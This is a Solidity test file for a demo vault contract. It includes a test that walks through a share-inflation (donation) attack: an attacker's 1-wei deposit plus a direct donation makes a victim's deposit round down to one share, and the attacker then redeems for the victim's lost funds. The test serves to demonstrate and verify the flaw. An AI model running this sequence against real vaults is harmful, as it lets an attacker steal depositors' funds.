// SPDX-License-Identifier: MIT OR Apache-2.0
pragma solidity 0.8.28;

import {DemoVault} from "../src/DemoVault.sol";

interface Vm {
    function prank(address) external;
    function deal(address, uint256) external;
}

/// forge test --match-contract DemoVaultTest
contract DemoVaultTest {
    Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    address constant ATTACKER = address(0xA77AC);
    address constant VICTIM = address(0x5AFE);
    uint256 constant P = 1e14; // 0.0001 ETH

    function eq(uint256 a, uint256 b, string memory what) internal pure {
        require(a == b, what);
    }

    function testHonestDepositIsOneToOne() public {
        DemoVault v = new DemoVault{salt: keccak256("dabao vault test")}();
        require(address(v).balance == 0, "fresh vault");
        vm.deal(VICTIM, P);
        vm.prank(VICTIM);
        eq(v.deposit{value: P}(VICTIM), P, "shares");
        eq(v.previewRedeem(v.balanceOf(VICTIM)), P, "worth");
    }

    function testInflationAttack() public {
        DemoVault v = new DemoVault{salt: keccak256("dabao vault test")}();
        require(address(v).balance == 0, "fresh vault");
        vm.deal(ATTACKER, 1e18);
        vm.deal(VICTIM, P);
        vm.prank(ATTACKER);
        v.deposit{value: 1}(ATTACKER);
        vm.prank(ATTACKER);
        (bool ok,) = address(v).call{value: 6e13}("");
        require(ok, "donate");
        vm.prank(VICTIM);
        eq(v.deposit{value: P}(VICTIM), 1, "victim gets 1 share");
        eq(v.previewRedeem(1), 8e13, "worth 0.00008 ETH");
        // the attacker's share: 6e13 + 1 wei in, 8e13 out (the victim's lost 2e13)
        vm.prank(ATTACKER);
        eq(v.redeem(1, ATTACKER, ATTACKER), 8e13, "attacker redeems");
        eq(v.totalSupply(), 1, "supply");
    }
}
